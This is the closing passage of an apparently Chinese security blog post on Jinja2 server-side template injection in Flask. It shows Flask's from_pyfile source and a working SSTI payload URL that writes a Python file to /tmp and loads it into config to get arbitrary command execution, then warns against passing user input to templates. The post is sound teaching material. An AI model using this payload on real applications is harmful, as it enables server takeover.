+<p>在config对象中，<code>from_pyfile</code>可以将对象加载到Flask的配置环境中<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">from_pyfile</span><span class="params">(self, filename, silent=False)</span>:</span></span><br><span class="line">        <span class="string">"""Updates the values in the config from a Python file.  This function</span></span><br><span class="line"><span class="string">        behaves as if the file was imported as module with the</span></span><br><span class="line"><span class="string">        :meth:`from_object` function.</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">        :param filename: the filename of the config.  This can either be an</span></span><br><span class="line"><span class="string">                         absolute filename or a filename relative to the</span></span><br><span class="line"><span class="string">                         root path.</span></span><br><span class="line"><span class="string">        :param silent: set to `True` if you want silent failure for missing</span></span><br><span class="line"><span class="string">                       files.</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">        .. versionadded:: 0.7</span></span><br><span class="line"><span class="string">           `silent` parameter.</span></span><br><span class="line"><span class="string">        """</span></span><br><span class="line">        filename = os.path.join(self.root_path, filename)</span><br><span class="line">        d = imp.new_module(<span class="string">'config'</span>)</span><br><span class="line">        d.__file__ = filename</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            <span class="keyword">with</span> open(filename) <span class="keyword">as</span> config_file:</span><br><span class="line">                exec(compile(config_file.read(), filename, <span class="string">'exec'</span>), d.__dict__)</span><br><span class="line">        <span class="keyword">except</span> IOError <span class="keyword">as</span> e:</span><br><span class="line">            <span class="keyword">if</span> silent <span class="keyword">and</span> e.errno <span class="keyword">in</span> (errno.ENOENT, errno.EISDIR):</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">            e.strerror = <span class="string">'Unable to load configuration file (%s)'</span> % e.strerror</span><br><span class="line">            <span class="keyword">raise</span></span><br><span class="line">        self.from_object(d)</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">True</span></span><br></pre></td></tr></table></figure></p>
+<p>这里我们可以利用file类向tmp目录下写入py文件，然后再对其编译，加载到config变量中<br>先进行文件的写入<br><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.5.128:5000/?name=&#123;&#123; ''.<span class="strong">__class__</span>.<span class="strong">__mro__</span>[<span class="string">2</span>].<span class="strong">__subclasses__</span>()[<span class="string">40</span>](<span class="link">'/tmp/cmd', 'w'</span>).write('from subprocess import check<span class="emphasis">_output\n\nRUNCMD = check_</span>output\n') &#125;&#125;</span><br></pre></td></tr></table></figure></p>
+<p><img src="https://raw.githubusercontent.com/kingkaki/cloud-img/master/blog-archive//Flask-Jinja2-SSTI-python-沙箱逃逸/6.png" alt><br>可以看到成功将文件写入<br>然后对其编译加载到config变量中<br><img src="https://raw.githubusercontent.com/kingkaki/cloud-img/master/blog-archive//Flask-Jinja2-SSTI-python-沙箱逃逸/7.png" alt><br>可以看到成功的将变量注册到了config中<br><img src="https://raw.githubusercontent.com/kingkaki/cloud-img/master/blog-archive//Flask-Jinja2-SSTI-python-沙箱逃逸/8.png" alt><br>接下来就可以任意命令执行了<br><img src="https://raw.githubusercontent.com/kingkaki/cloud-img/master/blog-archive//Flask-Jinja2-SSTI-python-沙箱逃逸/9.png" alt></p>
+<p>因此Jinja2中并不能因为其是一个沙箱环境，就忽视了SSTI的危害。<br>切记不能将用户输入传递到模板当中，至少目前情况可以直接get整个物理机的shell</p>
+<h1 id="Reference-link"><a href="#Reference-link" class="headerlink" title="Reference link"></a>Reference link</h1><p><a href="https://blog.0kami.cn/2016/09/16/old-python-sandbox-escape/" target="_blank" rel="noopener">https://blog.0kami.cn/2016/09/16/old-python-sandbox-escape/</a><br><a href="https://hatboy.github.io/2018/04/19/Python沙箱逃逸总结/" target="_blank" rel="noopener">https://hatboy.github.io/2018/04/19/Python沙箱逃逸总结/</a><br><a href="https://xz.aliyun.com/t/52" target="_blank" rel="noopener">https://xz.aliyun.com/t/52</a><br><a href="http://www.freebuf.com/articles/web/98928.html" target="_blank" rel="noopener">http://www.freebuf.com/articles/web/98928.html</a></p>
+
+
+                <hr>
+
+                
+
+                <ul class="pager">
+                    
+                        <li class="previous">
+                            <a href="/2018/07/随笔-7-3/" data-toggle="tooltip" data-placement="top" title="随笔-7.3">&larr; Previous Post</a>
+                        </li>
+                    
+                    
+                        <li class="next">
+                            <a href="/2018/06/flask-学习记录/" data-toggle="tooltip" data-placement="top" title="flask-学习记录">Next Post &rarr;</a>
+                        </li>
+                    
+                </ul>
+
+                
+
+                
+
+            </div>
+    <!-- Side Catalog Container -->
+        
+
+    <!-- Sidebar Container -->
+
+            <div class="
+                col-lg-8 col-lg-offset-2
+                col-md-10 col-md-offset-1
+                sidebar-container">
+
+                <!-- Featured Tags -->
+                
+                <section>
+                    <!-- no hr -->
+                    <h5><a href="/tags/">FEATURED TAGS</a></h5>
+                    <div class="tags">
+                       
+                          <a class="tag" href="/tags/#python" title="python">python</a>
+                        
+                          <a class="tag" href="/tags/#Flask" title="Flask">Flask</a>
+                        
+                          <a class="tag" href="/tags/#沙箱逃逸" title="沙箱逃逸">沙箱逃逸</a>
+                        
+                    </div>
+                </section>
+                
+
+                <!-- Friends Blog -->
+                
+                <hr>
+                <h5>FRIENDS</h5>
+                <ul class="list-inline">
+
+                    
+                        <li><a href="//98587329.github.io" target="_blank">mt</a></li>
+                    
+                        <li><a href="//www.cflowerth.com" target="_blank">FAtwAER</a></li>
+                    
+                        <li><a href="//lufe1.cn" target="_blank">lufei</a></li>
+                    
+                        <li><a href="//0x3f97.github.io" target="_blank">gd</a></li>
+                    
+                        <li><a href="http://www.lsafe.org" target="_blank">4dmin$5</a></li>
+                    
+                        <li><a href="http://www.thekingofnight.com/" target="_blank">theKingOfNight</a></li>
+                    
+                        <li><a href="http://www.thekingofnight.com/" target="_blank">Hpdoger</a></li>
+                    
+                        <li><a href="//mochazz.github.io/" target="_blank">七月火</a></li>
+                    
+                        <li><a href="https://mengsec.com/" target="_blank">蒙尘</a></li>
+                    
+                        <li><a href="https://patrilic.top/" target="_blank">Patrilic</a></li>
+                    
+                        <li><a href="https://threedr3am.github.io/" target="_blank">threedr3am</a></li>
+                    
+                        <li><a href="http://rui0.cn/" target="_blank">Ruilin</a></li>
+                    
+                        <li><a href="https://zgao.top/" target="_blank">zgao</a></li>
+                    
+                        <li><a href="https://www.zfjsec.com/" target="_blank">zfjsec</a></li>
+                    
+                </ul>
+                
+            </div>
+
+        </div>
+    </div>
+</article>
+
+
+
+
+
+
+
+<!-- async load function -->
+<script>
+    function async(u, c) {
+      var d = document, t = 'script',
+          o = d.createElement(t),
+          s = d.getElementsByTagName(t)[0];
+      o.src = u;
+      if (c) { o.addEventListener('load', function (e) { c(null, e); }, false); }
+      s.parentNode.insertBefore(o, s);
+    }
+</script>
+<!-- anchor-js, Doc:http://bryanbraun.github.io/anchorjs/ -->
+<script>
+    async("https://cdn.bootcss.com/anchor-js/1.1.1/anchor.min.js",function(){
+        anchors.options = {
+          visible: 'always',
+          placement: 'right',
+          icon: '#'
+        };
+        anchors.add().remove('.intro-header h1').remove('.subheading').remove('.sidebar-container h5');
+    })
+</script>
+<style>
+    /* place left on bigger screen */
+    @media all and (min-width: 800px) {
+        .anchorjs-link{
+            position: absolute;
+            left: -0.75em;
+            font-size: 1.1em;
+            margin-top : -0.1em;
+        }
+    }
+</style>
+
+
+
+    <!-- Footer -->
+    <!-- Footer -->
+<footer>
+    <div class="container">
+        <div class="row">
+            <div class="col-lg-8 col-lg-offset-2 col-md-10 col-md-offset-1">
+                <ul class="list-inline text-center">
+                
+                
+                
+
+                
+
+                
+
+                
+                    <li>
+                        <a target="_blank"  href="https://github.com/kingkaki">
+                            <span class="fa-stack fa-lg">
+                                <i class="fa fa-circle fa-stack-2x"></i>
+                                <i class="fa fa-github fa-stack-1x fa-inverse"></i>
+                            </span>
+                        </a>
+                    </li>
+                
+
+                
+
+                </ul>
+                <p class="copyright text-muted">
+                    Copyright &copy; Kingkk&#39;s Blog 2022 
+                    浙ICP备17041487号
+                    <br>
+                    Theme by <a href="http://huangxuan.me">Hux</a> 
+                    <span style="display: inline-block; margin: 0 5px;">
+                        <i class="fa fa-heart"></i>
+                    </span> 
+                    Ported by <a href="http://blog.kaijun.rocks">Kaijun</a>
+
+                    <!-- | 
+                    <iframe
+                        style="margin-left: 2px; margin-bottom:-5px;"
+                        frameborder="0" scrolling="0" width="91px" height="20px"
+                        src="https://ghbtns.com/github-btn.html?user=kaijun&repo=hexo-theme-huxblog&type=star&count=true" >
+                    </iframe>
+                    -->
+                </p>
+            </div>
+        </div>
+    </div>
+</footer>
+
+<!-- jQuery -->
+<script src="/js/jquery.min.js"></script>
+
+<!-- Bootstrap Core JavaScript -->
+<script src="/js/bootstrap.min.js"></script>
+
+<!-- Custom Theme JavaScript -->
+<script src="/js/hux-blog.min.js"></script>
+
+
+<!-- async load function -->
+<script>
+    function async(u, c) {
+      var d = document, t = 'script',
+          o = d.createElement(t),
+          s = d.getElementsByTagName(t)[0];
+      o.src = u;
+      if (c) { o.addEventListener('load', function (e) { c(null, e); }, false); }
+      s.parentNode.insertBefore(o, s);
+    }
+</script>
+
+<!-- 
+     Because of the native support for backtick-style fenced code blocks 
+     right within the Markdown is landed in Github Pages, 
+     From V1.6, There is no need for Highlight.js, 
+     so Huxblog drops it officially.
+
+     - https://github.com/blog/2100-github-pages-now-faster-and-simpler-with-jekyll-3-0  
+     - https://help.github.com/articles/creating-and-highlighting-code-blocks/    
+-->
+<!--
+    <script>
+        async("http://cdn.bootcss.com/highlight.js/8.6/highlight.min.js", function(){
+            hljs.initHighlightingOnLoad();
+        })
+    </script>
+    <link href="http://cdn.bootcss.com/highlight.js/8.6/styles/github.min.css" rel="stylesheet">
+-->
+
+
+<!-- jquery.tagcloud.js -->
+<script>
+    // only load tagcloud.js in tag.html
+    if($('#tag_cloud').length !== 0){
+        async("https://www.kingkk/js/jquery.tagcloud.js",function(){
+            $.fn.tagcloud.defaults = {
+                //size: {start: 1, end: 1, unit: 'em'},
+                color: {start: '#bbbbee', end: '#0085a1'},
+            };
+            $('#tag_cloud a').tagcloud();
+        })
+    }
+</script>
+
+<!--fastClick.js -->
+<script>
+    async("https://cdn.bootcss.com/fastclick/1.0.6/fastclick.min.js", function(){
+        var $nav = document.querySelector("nav");
+        if($nav) FastClick.attach($nav);
+    })
+</script>
+
+
+<!-- Google Analytics -->
+
+
+
+
+<!-- Baidu Tongji -->
+
+<script>
+    // dynamic User by Hux
+    var _baId = '2095437387a20021fd7e176e0c1aac8b';
+
+    // Originial
+    var _hmt = _hmt || [];
+    (function() {
+      var hm = document.createElement("script");
+      hm.src = "//hm.baidu.com/hm.js?" + _baId;
+      var s = document.getElementsByTagName("script")[0];
+      s.parentNode.insertBefore(hm, s);
+    })();
+</script>
+
+
+<!-- Side Catalog -->
+
+
+
+
+
+<!-- Image to hack wechat -->
+<img src="https://www.kingkk/img/icon_wechat.png" width="0" height="0" />
+<!-- Migrate from head to bottom, no longer block render and still work -->
+
+</body>
+
+</html>
